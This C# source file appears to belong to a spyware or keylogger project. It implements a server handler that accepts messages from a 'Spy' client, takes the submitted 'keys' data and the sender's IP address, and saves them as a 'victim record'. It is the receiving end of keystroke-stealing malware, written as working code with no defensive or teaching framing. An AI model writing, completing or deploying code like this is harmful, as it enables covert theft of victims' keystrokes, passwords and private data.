using SpyCommunicationLib;
using SpyCommunicationLib.Directors;
using System.Net;

namespace Server.Handlers
{
    internal class SpyHandler : IHandler
    {
        private static ServerResponseDirector _director = new ServerResponseDirector();

        public bool CheckConditions(SpyMessage? message)
        {
            if (message == null)
                return false;
            return message.Sender == Sender.Spy;
        }

        public async Task<string> SaveVictimRecord(SpyMessage message, ClientInfo clientInfo)
        {

            string keys = message.GetOption("keys");
            string ip = clientInfo.RemoteEndPoint.ToString().Split(":")[0];

            if (string.IsNullOrEmpty(keys))
                return _director.GetBadRequestResponse().ToString();


            Data.RecordsContainer.AddRecord(keys, ip);

            return _director.GetSuccessResponse().ToString();
        }

        public async Task<string> HandleAsync(SpyMessage? message, ClientInfo clientInfo)
        {
            if (message == null)
                return _director.GetBadRequestResponse().ToString();

            string response;

            switch (message.Action)
            { 
                case MessageAction.SendData:
                    response = await SaveVictimRecord(message, clientInfo);
                    break;
                default:
                    response = _director.GetNotFoundRequestResponse().ToString();
                    break;
            }

            return response;
        }
    }
}
